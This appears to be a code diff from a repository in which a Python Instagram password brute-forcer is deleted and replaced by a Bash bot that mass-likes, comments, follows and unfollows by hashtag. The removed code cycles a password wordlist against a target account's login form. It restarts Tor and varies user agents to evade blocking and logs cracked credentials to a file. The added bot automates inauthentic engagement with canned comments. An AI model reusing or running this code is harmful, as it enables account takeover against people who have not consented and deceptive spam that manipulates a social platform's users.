@@ -1,160 +1,289 @@
 #!/bin/bash
-import os
-import time
-import socks
-import socket
-import signal
-import random
-import datetime
-import cookielib
-import subprocess 
 
-from Core.art import Colors
-from Core.art import Display
 
-def Setup_Mechanize():  
-  global Br
-  Br=mechanize.Browser(history=Void())
-  CJ=cookielib.LWPCookieJar()
-  Br.set_cookiejar(CJ)
-  Br.set_handle_equiv(True)
-  Br.set_handle_referer(True)
-  Br.set_handle_robots(False)
-  Br.set_handle_refresh(True)
-  Br.set_handle_redirect(True)
-  Br.addheaders=[('User-agent',random.choice(Agents))]
-  Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+############################################################
+###################### Bot Config ##########################
 
-class Void(object): 
- def add(self, *args, **kargs):pass 
- def clear(self):pass 
+## Your Credentials here
 
-def Brute_Force(Email,Pass):
-  try:
-   Br.select_form(nr=0)
-   Br.form['username']=Email
-   Br.form['password']=Pass
-   Br.submit()
-   if Br.geturl() != Url:
-    Access_Granted(Email,Pass)
-  except KeyboardInterrupt:Exit()
-   
-def Connect(address, timeout=None, source_address=None):
-  sock=socks.socksocket()
-  sock.connect(address)
-  return sock
+default_username=""
+default_password=""
 
-def Obtain_Proxy_IP():
-  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
-  socket.socket=socks.socksocket
-  socket.Connect=Connect
-  
-def User_Input(Logins=[]):
-  subprocess.call(['clear']);print art
-  for i in range(11):print'\n'
-  try:
-   Email=raw_input('{}[{}-{}]{} Enter [ Email || Username ] :{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
-   Passlist=raw_input('{}[{}-{}]{} Enter Passlist:{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
-   return Email,Passlist
-  except KeyboardInterrupt:
-   Exit()
+## Comments
 
-def Exit():  
-  print '{}'.format(Red)
-  subprocess.call(['service','tor','stop'])
-  os.kill(os.getpid(),signal.SIGTERM)
-  exit() 
-      
-def Install_Tor():
-  subprocess.call(['clear'])
-  time.sleep(0.7)
-  print '[!] Installing Tor ...';time.sleep(0.7);
-  subprocess.call(['apt-get','update'])
-  subprocess.call(['apt-get','install','tor','-y'])
-  subprocess.call(['apt-get','install','--fix-missing'])
+arr[0]="Your profile is amazing!"
+arr[1]="Its look good"
+arr[2]="Your feed is great!"
+arr[3]="Yours pictures are so good!"
+arr[4]=":)"
+arr[5]="i liked that"
+arr[6]="yes!"
 
-def Refresh():
-  try:  
-   Restart_Tor()
-   Obtain_Proxy_IP()
-   Setup_Mechanize()
-   time.sleep(3)
-  except KeyboardInterrupt:
-   Exit()
+############################################################
 
-def Restart_Tor():
-  subprocess.call(['service','tor','restart'])
-  time.sleep(1)
+rand=$[$RANDOM % ${#arr[@]}]
+IFS=$'\n'
+commt=$(echo ${arr[$rand]})
 
-def Message(Email):
-  subprocess.call(['clear'])
-  print art
-  for i in range(10):print'\n'
-  print '{}[{}!{}]{} Brute Force In Progress ...{}'.format(Red,Yellow,Red,Yellow,White)
-  print '{}[{}-{}]{} Email: {}{}{}'.format(Red,Yellow,Red,White,Yellow,Email,White)
-  print '{}[{}-{}]{} Pass:  {}{}{}'.format(Red,Yellow,Red,White,Yellow,passwrd,White)
-  print '{}[{}*{}]{} Attempts: {}{}{}'.format(Red,Yellow,Red,White,Yellow,attempt,White)
+counter1=0
+counter2=0
+turn=2
+startline_bot=1
+endline_bot=1
+startline_follow=1
+endline_follow=1
 
-def Current_Time():
-  now  = datetime.datetime.now()
-  time = now.strftime("%Y-%m-%d %H:%M")
-  date = time[:10]
-  mins = time[-3:]
-  hrs  = int(time[-5:-3])
-  zone = 'am'
 
-  if hrs > 12:
-   hrs  = hrs-12
-   zone = 'pm'
+csrftoken=$(curl https://www.instagram.com/accounts/login/ajax -L -i -s | grep "csrftoken" | cut -d "=" -f2 | cut -d ";" -f1)
 
-  return '{} {}{} {}'.format(date,hrs,mins,zone)
+banner() {
 
-def Access_Granted(email,password):
-  with open('Cracked.txt','a') as File:
-   File.write('Username: {}\nPassword: {}\nTime Started: {}\nTime Accessed: {}\n\n'.format(email,password,Time_Started,Current_Time()))
-  Exit()
-  
-if __name__ == '__main__':
-  if os.getuid():
-   exit('{}[{}!{}]{} Root Access Required'.format(Red,Yellow,Red,Blue))
+printf "\e[1;92m   ____ _           _          ____        _    \e[0m\n"
+printf "\e[1;92m  / ___| |__   ___ (_) ___ ___| __ )  ___ | |_  \e[0m\n"
+printf "\e[1;92m | |   | '_ \ / _ \| |/ __/ _ \  _ \ / _ \| __| \e[0m\n"
+printf "\e[1;92m | |___| | | | (_) | | (_|  __/ |_) | (_) | |_  \e[0m\n"
+printf "\e[1;92m  \____|_| |_|\___/|_|\___\___|____/ \___/ \__| \e[0mv1.1\n"
+printf "\n"
+printf "\e[1;77m\e[45m        Instagram bot by @thelinuxchoice       \e[0m\n"
+printf "\n"                                    
 
-  Red,Blue,Green,Yellow,White=Colors[0],Colors[1],Colors[2],Colors[3],Colors[4]
+}
 
-  art=Display()
-  Attempt,attempt=1,1
-  Url='https://www.instagram.com/accounts/login/?force_classic_login'
-  
-  Agents=[( 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
-	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
-	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
-	      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36' )]
+dependencies() {
+
+
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run apt-get install curl"; exit 1; }
+}
+
+check_hashtag() {
+touch hashtags.txt
+total_hashtag=$(wc -l hashtags.txt | cut -d " " -f1)
+
+if [ $total_hashtag == "0" ]; then
+printf "\e[1;93m[!] Please, put your hashtags on file: \e[0m\e[1;77m hashtags.txt\e[0m\e[1;93m (1 per line, without #)\e[0m\n"
+exit 1
+fi
+
+}
+
+stop() {
+touch likes comments follows unfollows followedtotal.txt
+cat follows >> followedtotal.txt
+cat unfollows >> unfollowedtotal.txt
+session_likes=$(wc -l likes | cut -d " " -f1)
+session_comments=$(wc -l comments | cut -d " " -f1)
+session_follows=$(wc -l follows | cut -d " " -f1)
+session_unfollows=$(wc -l unfollows | cut -d " " -f1)
+total_likes=$(wc -l liked.txt | cut -d " " -f1)
+total_comments=$(wc -l commented.txt | cut -d " " -f1)
+total_follows=$(wc -l followedtotal.txt | cut -d " " -f1)
+total_unfollows=$(wc -l unfollowedtotal.txt | cut -d " " -f1)
+rm -rf likes comments follows unfollows
+printf "\e[1;31m[*] Bot stopped.\e[0m\n"
+printf "\n"
+printf "\e[1;92m[*] Statistics for this session:\e[0m\n"
+printf "\e[1;93m[*] Likes: \e[0m\e[1;77m%s\e[0m\n" $session_likes
+printf "\e[1;93m[*] Comments: \e[0m\e[1;77m%s\e[0m\n" $session_comments
+printf "\e[1;93m[*] Follows: \e[0m\e[1;77m%s\e[0m\n" $session_follows
+printf "\e[1;93m[*] Unfollows: \e[0m\e[1;77m%s\e[0m\n" $session_unfollows
+printf "\n"
+printf "\e[1;92m[*] Statistics total:\e[0m\n"
+
+printf "\e[1;93m[*] Likes: \e[0m\e[1;77m%s\e[0m\n" $total_likes
+printf "\e[1;93m[*] Comments: \e[0m\e[1;77m%s\e[0m\n" $total_comments
+printf "\e[1;93m[*] Follows: \e[0m\e[1;77m%s\e[0m\n" $total_follows
+printf "\e[1;93m[*] Unfollows: \e[0m\e[1;77m%s\e[0m\n" $total_unfollows
+res2=$(date +%s)
+secs=$(($res1-$res2))
+
+printf '\e[1;93m[*] Work time:\e[0m\e[1;77m %dd:%dh:%dm:%ds\e[0m\n' $(($secs/86400)) $(($secs%86400/3600)) $(($secs%3600/60)) \
+  $(($secs%60))
+
+exit 1
+
+}
+
+
+login_user() {
+
+if [[ "$default_username" == "" ]]; then
+read -p $'\e[1;92m[*] Username: \e[0m' username
+else
+username="${username:-${default_username}}"
+fi
+
+if [[ "$default_password" == "" ]]; then
+read -s -p $'\e[1;92m[*] Password: \e[0m' password
+else
+password="${password:-${default_password}}"
+fi
+
+printf "\e[\n1;77m[*] Trying to login as\e[0m\e[1;77m %s\e[0m\n" $username
+check_login=$(curl -c cookies.txt 'https://www.instagram.com/accounts/login/ajax/' -H 'Cookie: csrftoken='$csrftoken'' -H 'X-Instagram-AJAX: 1' -H 'Referer: https://www.instagram.com/' -H 'X-CSRFToken:'$csrftoken'' -H 'X-Requested-With: XMLHttpRequest' --data 'username='$username'&password='$password'&intent' -L --compressed -s | grep -o '"authenticated": true')
+
+if [[ "$check_login" == *'"authenticated": true'* ]]; then
+printf "\e[1;92m[*] Login Successful!\e[0m\n"
+else
+printf "\e[1;93m[!] Check your login data or IP! Dont use Tor, VPN, Proxy. It's requires your usual IP.\n\e[0m"
+exit 1
+fi
+
+}
+
+createlist() {
+touch liked.txt commented.txt followed.txt
+rm -rf hashtags_id.txt owner_id.txt
+IFS=$'\n'
+for hashtag in $(cat hashtags.txt);do
+
+printf "\e[1;77m[*] Creating media list for hashtag %s\e[0m\n" $hashtag
+{( trap '' SIGINT && curl -s -L https://www.instagram.com/explore/tags/$hashtag/?__a=1 | grep  -o '"node":{"comments_disabled":false,"id":"..................[0-9]'  | cut -d ":" -f4 | tr -d '\"' | head -n 10 >> hashtags_id.txt )} & wait $!;
+printf "\e[1;77m[*] Creating follower list for hashtag %s\e[0m\n" $hashtag
+{( trap '' SIGINT && curl -L -s https://www.instagram.com/explore/tags/hacking/?__a=1 | grep  -o '"owner":{"id":".........[0-9]"'  | cut -d ":" -f3 | tr -d '\"' | head -n 10 >> owner_id.txt )} & wait $!;
+
+done
+
+}
+
+bot() {
+
+likes=0
+comments=0
+follows=0
+while [ $counter1 -lt $turn ]; do
+
+for media_id in $(sed -n ''$startline_bot','$endline_bot'p' hashtags_id.txt); do 
+let count_media++
+
+my_media=$(curl -s https://www.instagram.com/$username/ -L | grep  -o '"GraphImage","id":"..................[0-9]"' | cut -d ":" -f2 | tr -d '\"' | grep -o "$media_id")
+if [[ "$my_media" == "" ]]; then
+check_media=$(grep -o "$media_id" liked.txt)
+
+if [[ "$check_media" == "" ]]; then
+printf "\e[1;77m[*] Trying to like media id %s\e[0m\n" $media_id
+
+#like
+
+{( trap '' SIGINT && like=$(curl -b cookies.txt -H 'Cookie: csrftoken=$csrftoken' -H 'X-Instagram-AJAX: 1' -H 'Referer: https://www.instagram.com/' -H 'X-CSRFToken:$csrftoken' -H 'X-Requested-With: XMLHttpRequest' "https://www.instagram.com/web/likes/$media_id/like" -s -L --request POST | grep -o '"status": "ok"'); if [[ "$like" == *'"status": "ok"'* ]]; then printf "\e[1;92m[*] Media liked\e[0m\n"; printf "%s\n" $media_id >> liked.txt; let likes++ ; echo $likes >> likes ; sleep 60; else printf "\e[1;93m[!] Media not liked\e[0m\n"; sleep 300; fi  )} & wait $!;
  
-  if not os.path.exists('/usr/bin/tor'):Install_Tor()
-  from Core.Conf import ReWrite
-  ReWrite()
-  
-  try:import mechanize
-  except ImportError: 
-   call(['clear'])
-   print '[!] Installing Mechanize ...';time.sleep(0.9);
-   call(['pip','install','mechanize'])
-  finally:import mechanize
+fi # check_media
+fi # my media
 
-  Input = User_Input()
-  Email = Input[0]
-  Pass  = Input[1]
+#comment
+
+if [[ "$my_media" == "" ]]; then
+check_comment=$(grep -o "$media_id" commented.txt)
+
+if [[ "$check_comment" == "" ]]; then
+printf "\e[1;77m[*] Trying to comment media id %s\e[0m\n" $media_id
+{( trap '' SIGINT && comment=$(curl --data 'comment_text='$commt'' -b cookies.txt -H 'Cookie: csrftoken='$csrftoken'' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' -H 'Content-Lenght: 0' -H 'X-Instagram-AJAX: 1' -H 'Host: www.instagram.com' -H 'Referer: https://www.instagram.com/' -H 'X-CSRFToken:'$csrftoken'' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://www.instagram.com' -H 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -H 'Content-Type: application/x-www-form-urlencoded' --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -s -L  "https://www.instagram.com/web/comments/$media_id/add/" -w "\n%{http_code}\n" | grep -a "200"); if [[ "$comment" == "200" ]]; then printf "\e[1;92m[*] Media commented\e[0m\n"; let comments++ ; printf "%s\n" $media_id >> commented.txt;  echo $comments >> comments ; sleep 60 ; else printf "\e[1;93m[!] Media not commented\e[0m\n"; sleep 300; fi; )} & wait $!;
+
+fi
+fi
+
+let counter1++
+let startline_bot++
+let endline_bot++
+done
+done
+}
+
+function owner_follow()  {
  
-  ReWrite();Refresh();Br.open(Url)
-  Time_Started=Current_Time()
-  with open(Pass,'r') as File:
-   for passwrd in File:
-    if not len(passwrd):continue 
-    try:
-     passwrd = passwrd.replace('\n','')
-     Message(Email)
-     Brute_Force(Email,passwrd)
-     if Attempt==3:Refresh();Br.open(Url);Attempt=0
-     Attempt+=1
-     attempt+=1
-    except KeyboardInterrupt:Exit()
-  Exit()
+while [ $counter2 -lt $turn ]; do
+let count_owner++
+
+for owner_id in  $(sed -n ''$startline_follow','$endline_follow'p' owner_id.txt); do
+
+my_id=$(curl -s "https://www.instagram.com/$username/" -L | grep -o 'profilePage_.*"' | cut -d "," -f1 | cut -d "_" -f2 | tr -d '\"')
+check_id=$(grep -o "$my_id" owner_id.txt )
+
+if [[ "$check_id" == "" ]]; then
+check_follow=$(grep -o "$owner_id" followed.txt)
+
+if [[ "$check_follow" == "" ]]; then
+
+count_followers=$(curl -s -L "https://i.instagram.com/api/v1/users/$owner_id/info/" | grep -o 'follower_count":.*,' | cut -d "," -f1 | cut -d ":" -f2 | tr -d " ")
+
+if [[ "$count_followers" -gt "1500" ]]; then
+printf "\e[1;93m[!] Selebgram or fake account, not following %s\e[0m\n" $owner_id
+sleep 10
+let counter2++
+else
+
+#follow
+
+printf "\e[1;77m[*] Trying to follow user id %s\e[0m\n" $owner_id
+
+{( trap '' SIGINT && follow=$(curl -b cookies.txt -H 'Cookie: csrftoken='$csrftoken'' -H 'X-Instagram-AJAX: 1' -H 'Referer: https://www.instagram.com/' -H 'X-CSRFToken:'$csrftoken'' -H 'X-Requested-With: XMLHttpRequest' "https://www.instagram.com/web/friendships/$owner_id/follow/" -s -L --request POST | grep -o '"status": "ok"'); if [[ "$follow" == *'"status": "ok"'* ]]; then printf "\e[1;92m[*] User followed\e[0m\n"; printf "%s\n" $owner_id >> followed.txt; let follows++ ; echo $follows >> follows ; sleep 60 ; else printf "\e[1;93m[!] User not followed\e[0m\n" ; sleep 300 ; fi   )} & wait $!;
+
+
+fi
+
+fi #check_id
+fi #check follow
+let counter2++
+let startline_follow++
+let endline_follow++
+done
+done
+
+}
+
+
+unfollow() {
+touch unfollows
+unfollows=0
+total_unfollow=$(wc -l followed.txt | cut -d " " -f1)
+if [[ $total_unfollow -gt 0 ]]; then
+
+for ownerid in $(cat followed.txt);do
+
+printf "\e[1;77m[*] Trying to unfollow user id %s\e[0m\n" $ownerid
+
+{( trap '' SIGINT && unfollow=$(curl -b cookies.txt -H 'Cookie: csrftoken='$csrftoken'' -H 'X-Instagram-AJAX: 1' -H 'Referer: https://www.instagram.com/' -H 'X-CSRFToken:'$csrftoken'' -H 'X-Requested-With: XMLHttpRequest' "https://www.instagram.com/web/friendships/$ownerid/unfollow/" -s -L --request POST | grep -o '"status": "ok"'); if [[ "$unfollow" == *'"status": "ok"'* ]]; then printf "\e[1;92m[*] User unfollowed\e[0m\n" ; awk '!/'$ownerid'/' followed.txt > temp && mv temp followed.txt ; let unfollows++ ; echo $unfollows >> unfollows ; sleep 30 ; else printf "\e[1;93m[!] User not unfollowed\e[0m\n" ; sleep 300 ; fi )} & wait $!;
+
+done
+fi # total_follow
+remain=$(wc -l followed.txt | cut -d " " -f1)
+session_unfollows=$(wc -l unfollows | cut -d " " -f1)
+printf "\e[1;92m[*] Total unfollows:\e[0m\e[1;77m %s\e[0m\n" $session_unfollows 
+if [[ $total_follow -gt 0 ]]; then
+printf "\e[1;92m[*] Remaining:\e[0m\e[1;77m %s\e[0m\n" $remain
+fi 
+
+}
+
+res1=$(date +%s)
+start_date=$(date +%H:%M:%S)
+
+function control() {
+
+count_media=0
+count_owner=0
+total_media=$(wc -l hashtags_id.txt | cut -d " " -f1)
+total_owner=$(wc -l owner_id.txt | cut -d " " -f1)
+
+while [ $count_media -lt $total_media ] && [ "$count_owner" -lt "$total_owner" ]; do
+bot
+owner_follow
+let turn+=1
+done
+unfollow
+createlist
+let count_media=0
+let count_owner=0
+let startline_bot=1
+let endline_bot=1
+let startline_follow=1
+let endline_follow=1
+control
+
+}
+banner
+dependencies
+check_hashtag
+login_user
+printf "\e[1;93m[*] Bot started at:\e[0m\e[1;77m %s\e[0m\n" $start_date
+createlist
+control
